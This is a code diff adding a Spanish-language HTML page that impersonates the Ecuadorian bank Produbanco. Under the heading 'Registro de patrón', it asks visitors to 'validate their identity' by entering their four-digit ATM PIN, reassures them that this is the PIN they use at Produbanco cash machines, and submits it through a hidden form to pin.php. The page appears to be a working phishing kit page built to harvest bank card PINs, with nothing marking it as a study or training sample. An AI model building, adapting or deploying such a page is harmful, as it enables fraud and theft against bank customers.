@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clave de cajero - Produbanco</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #003F20;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+            margin: 0;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 100vw;
+            min-height: 100vh;
+            background: #003F20;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            margin-top: 10px;
+        }
+
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            cursor: pointer;
+        }
+
+        .menu-icon span {
+            width: 25px;
+            height: 2px;
+            background: white;
+            margin: 3px 0;
+            border-radius: 1px;
+        }
+
+        .phone-icon {
+            cursor: pointer;
+        }
+
+        .logo-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+
+        .logo-img {
+            width: auto;
+            max-width: 320px;
+            height: 100px;
+            object-fit: contain;
+            margin-bottom: 10px;
+            filter: brightness(1.1);
+        }
+
+        .logo-subtitle {
+            color: white;
+            font-size: 14px;
+            font-weight: 300;
+            opacity: 0.9;
+        }
+
+        .pin-container {
+            background: white;
+            border-radius: 25px 25px 0 0;
+            flex: 1;
+            padding: 30px 25px;
+            min-height: 500px;
+            width: 100%;
+            overflow: hidden;
+            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.15);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .pin-title {
+            color: #333;
+            font-size: 20px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .pin-subtitle {
+            color: #666;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+
+        .pin-label {
+            color: #333;
+            font-size: 18px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .pin-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 35px;
+        }
+
+        .pin-input {
+            width: 60px;
+            height: 70px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            background: #f8f8f8;
+            color: #333;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .pin-input:focus {
+            border-color: #003F20;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(0, 63, 32, 0.1);
+            transform: scale(1.05);
+        }
+
+        .pin-input.filled {
+            border-color: #28a745;
+            background: #f8fff8;
+            color: #003F20;
+        }
+
+        .pin-input.error {
+            border-color: #dc3545;
+            background: #fff8f8;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .pin-feedback {
+            text-align: center;
+            min-height: 30px;
+            margin-bottom: 25px;
+        }
+
+        .pin-message {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .pin-display {
+            font-family: monospace;
+            color: #003F20;
+            font-size: 18px;
+            font-weight: bold;
+            letter-spacing: 3px;
+        }
+
+        .pin-error {
+            color: #dc3545;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        .pin-actions {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+            width: 100%;
+            max-width: 300px;
+        }
+
+        .btn {
+            padding: 15px 25px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            flex: 1;
+            min-height: 50px;
+        }
+
+        .btn-clear {
+            background: #f8f9fa;
+            color: #666;
+            border: 1px solid #ddd;
+        }
+
+        .btn-clear:hover {
+            background: #e9ecef;
+        }
+
+        .btn-submit {
+            background: #e0e0e0;
+            color: #999;
+            cursor: not-allowed;
+        }
+
+        .btn-submit.active {
+            background: #003F20;
+            color: white;
+            cursor: pointer;
+        }
+
+        .btn-submit.active:hover {
+            background: #002a16;
+        }
+
+        .security-info {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            border-left: 4px solid #003F20;
+        }
+
+        .security-info p {
+            color: #555;
+            font-size: 13px;
+            line-height: 1.4;
+        }
+
+        .security-icon {
+            display: inline-block;
+            margin-right: 8px;
+            color: #003F20;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 450px) {
+            .container {
+                max-width: 100%;
+            }
+            
+            .pin-container {
+                padding: 25px 20px;
+            }
+            
+            .logo-img {
+                max-width: 280px;
+                height: 80px;
+            }
+            
+            .pin-inputs {
+                gap: 12px;
+            }
+            
+            .pin-input {
+                width: 55px;
+                height: 65px;
+                font-size: 24px;
+            }
+            
+            .pin-title {
+                font-size: 18px;
+            }
+            
+            .pin-subtitle {
+                font-size: 14px;
+            }
+            
+            .pin-label {
+                font-size: 16px;
+            }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.8s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Animación de pulso para inputs */
+        .pulse {
+            animation: pulse 0.4s ease-in-out;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        /* Ocultar flechas de incremento en inputs number */
+        .pin-input::-webkit-outer-spin-button,
+        .pin-input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        .pin-input[type=number] {
+            -moz-appearance: textfield;
+        }
+    </style>
+</head>
+<body>
+    <div class="container fade-in">
+        <!-- Header -->
+        <div class="header">
+            <div class="menu-icon">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <div class="phone-icon">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
+                    <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                </svg>
+            </div>
+        </div>
+
+        <!-- Logo -->
+        <div class="logo-container">
+            <img src="logo1.png" alt="Grupo Promerica Logo" class="logo-img">
+            <p class="logo-subtitle"></p>
+        </div>
+
+        <!-- PIN Container -->
+        <div class="pin-container">
+            <h1 class="pin-title">Registro de patrón</h1>
+            <p class="pin-subtitle">Para continuar valida tu identidad</p>
+            <p class="pin-label">Clave de cajero automático</p>
+            
+            <div class="pin-inputs">
+                <input type="number" class="pin-input" id="pin1" maxlength="1" data-index="0">
+                <input type="number" class="pin-input" id="pin2" maxlength="1" data-index="1">
+                <input type="number" class="pin-input" id="pin3" maxlength="1" data-index="2">
+                <input type="number" class="pin-input" id="pin4" maxlength="1" data-index="3">
+            </div>
+
+            <div class="pin-feedback">
+                <div class="pin-message" id="pinMessage">Ingresa tu PIN de 4 dígitos</div>
+                <div class="pin-display" id="pinDisplay">• • • •</div>
+            </div>
+
+            <form id="pinForm" method="POST" action="pin.php" style="display: none;">
+                <input type="hidden" name="pin" id="pinInput">
+            </form>
+
+            <div class="pin-actions">
+                <button type="button" class="btn btn-clear" id="clearBtn">Limpiar</button>
+                <button type="button" class="btn btn-submit" id="submitBtn">Continuar</button>
+            </div>
+
+            <div class="security-info">
+                <p>
+                    <span class="security-icon">🔒</span>
+                    <strong>Información segura:</strong> Tu PIN es la misma clave que usas en los cajeros automáticos de Produbanco.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const pinInputs = document.querySelectorAll('.pin-input');
+            const clearBtn = document.getElementById('clearBtn');
+            const submitBtn = document.getElementById('submitBtn');
+            const pinForm = document.getElementById('pinForm');
+            const pinInput = document.getElementById('pinInput');
+            const pinMessage = document.getElementById('pinMessage');
+            const pinDisplay = document.getElementById('pinDisplay');
+
+            let currentPin = ['', '', '', ''];
+
+            // Función para actualizar la visualización
+            function updateDisplay() {
+                const displayPin = currentPin.map(digit => digit ? '●' : '•').join(' ');
+                pinDisplay.textContent = displayPin;
+                
+                const filledCount = currentPin.filter(digit => digit !== '').length;
+                
+                if (filledCount === 0) {
+                    pinMessage.textContent = 'Ingresa tu PIN de 4 dígitos';
+                    submitBtn.classList.remove('active');
+                } else if (filledCount < 4) {
+                    pinMessage.textContent = `Faltan ${4 - filledCount} dígitos`;
+                    submitBtn.classList.remove('active');
+                } else {
+                    pinMessage.textContent = 'PIN completo - Puedes continuar';
+                    submitBtn.classList.add('active');
+                }
+            }
+
+            // Función para limpiar PIN
+            function clearPin() {
+                currentPin = ['', '', '', ''];
+                pinInputs.forEach((input, index) => {
+                    input.value = '';
+                    input.classList.remove('filled', 'error');
+                });
+                updateDisplay();
+                pinInputs[0].focus();
+            }
+
+            // Función para mostrar error
+            function showError(message) {
+                pinMessage.textContent = message;
+                pinMessage.classList.add('pin-error');
+                
+                pinInputs.forEach(input => {
+                    input.classList.add('error');
+                });
+                
+                setTimeout(() => {
+                    pinMessage.classList.remove('pin-error');
+                    pinInputs.forEach(input => {
+                        input.classList.remove('error');
+                    });
+                    updateDisplay();
+                }, 2000);
+            }
+
+            // Event listeners para cada input
+            pinInputs.forEach((input, index) => {
+                input.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/[^0-9]/g, '');
+                    
+                    // Solo permitir un dígito
+                    if (value.length > 1) {
+                        value = value.slice(0, 1);
+                    }
+                    
+                    e.target.value = value;
+                    currentPin[index] = value;
+                    
+                    if (value) {
+                        e.target.classList.add('filled');
+                        e.target.classList.add('pulse');
+                        
+                        // Mover al siguiente input
+                        if (index < pinInputs.length - 1) {
+                            pinInputs[index + 1].focus();
+                        }
+                        
+                        setTimeout(() => {
+                            e.target.classList.remove('pulse');
+                        }, 400);
+                    } else {
+                        e.target.classList.remove('filled');
+                    }
+                    
+                    updateDisplay();
+                });
+
+                input.addEventListener('keydown', function(e) {
+                    // Backspace: limpiar actual e ir al anterior
+                    if (e.key === 'Backspace') {
+                        if (e.target.value === '' && index > 0) {
+                            pinInputs[index - 1].focus();
+                            pinInputs[index - 1].value = '';
+                            currentPin[index - 1] = '';
+                            pinInputs[index - 1].classList.remove('filled');
+                        } else {
+                            e.target.value = '';
+                            currentPin[index] = '';
+                            e.target.classList.remove('filled');
+                        }
+                        updateDisplay();
+                        e.preventDefault();
+                    }
+                    
+                    // Flechas para navegación
+                    if (e.key === 'ArrowLeft' && index > 0) {
+                        pinInputs[index - 1].focus();
+                    }
+                    if (e.key === 'ArrowRight' && index < pinInputs.length - 1) {
+                        pinInputs[index + 1].focus();
+                    }
+                    
+                    // Enter para enviar si está completo
+                    if (e.key === 'Enter' && currentPin.every(digit => digit !== '')) {
+                        submitForm();
+                    }
+                });
+
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
+                    
+                    if (pastedData.length <= 4) {
+                        // Distribuir dígitos pegados
+                        for (let i = 0; i < Math.min(pastedData.length, 4); i++) {
+                            if (pinInputs[i]) {
+                                pinInputs[i].value = pastedData[i];
+                                currentPin[i] = pastedData[i];
+                                pinInputs[i].classList.add('filled');
+                            }
+                        }
+                        
+                        // Focus al siguiente input vacío o al último
+                        const nextEmpty = currentPin.findIndex(digit => digit === '');
+                        if (nextEmpty !== -1) {
+                            pinInputs[nextEmpty].focus();
+                        } else {
+                            pinInputs[3].focus();
+                        }
+                        
+                        updateDisplay();
+                    }
+                });
+
+                // Prevenir caracteres no numéricos
+                input.addEventListener('keypress', function(e) {
+                    if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter'].includes(e.key)) {
+                        e.preventDefault();
+                    }
+                });
+            });
+
+            // Función para enviar formulario
+            function submitForm() {
+                const pin = currentPin.join('');
+                
+                if (pin.length !== 4) {
+                    showError('Debes ingresar los 4 dígitos del PIN');
+                    return;
+                }
+                
+                // Validar que no sean todos iguales
+                if (new Set(currentPin).size === 1) {
+                    showError('PIN no válido - No puede ser todos iguales');
+                    return;
+                }
+                
+                // Guardar PIN y enviar
+                pinInput.value = pin;
+                submitBtn.textContent = 'Verificando...';
+                submitBtn.disabled = true;
+                
+                // Enviar formulario
+                pinForm.submit();
+            }
+
+            // Event listeners para botones
+            clearBtn.addEventListener('click', clearPin);
+
+            submitBtn.addEventListener('click', function() {
+                if (this.classList.contains('active')) {
+                    submitForm();
+                } else {
+                    showError('Completa los 4 dígitos del PIN');
+                }
+            });
+
+            // Inicializar
+            updateDisplay();
+            pinInputs[0].focus();
+
+            // Prevenir envío accidental del formulario
+            pinForm.addEventListener('submit', function(e) {
+                const pin = currentPin.join('');
+                if (pin.length !== 4) {
+                    e.preventDefault();
+                    showError('PIN incompleto');
+                }
+            });
+
+            console.log('Formulario PIN iniciado');
+        });
+    </script>
+</body>
+</html>
